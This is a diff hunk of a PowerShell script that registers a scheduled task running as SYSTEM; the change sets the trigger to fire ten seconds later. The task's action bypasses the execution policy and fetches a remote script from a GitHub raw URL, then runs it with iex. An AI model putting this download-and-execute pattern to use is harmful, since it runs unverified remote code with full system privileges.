@@ -11,7 +11,7 @@ else {
     $actionString = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/vyashya12/dashboardfeeder/main/test.ps1'))"
 
     # Trigger to run once
-    $triggerString = New-ScheduledTaskTrigger -Once
+    $triggerString = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
 
     # Registering task
     Register-ScheduledTask -TaskName $taskNameString -Action $action -Trigger $triggerString -User "SYSTEM" -RunLevel Highest
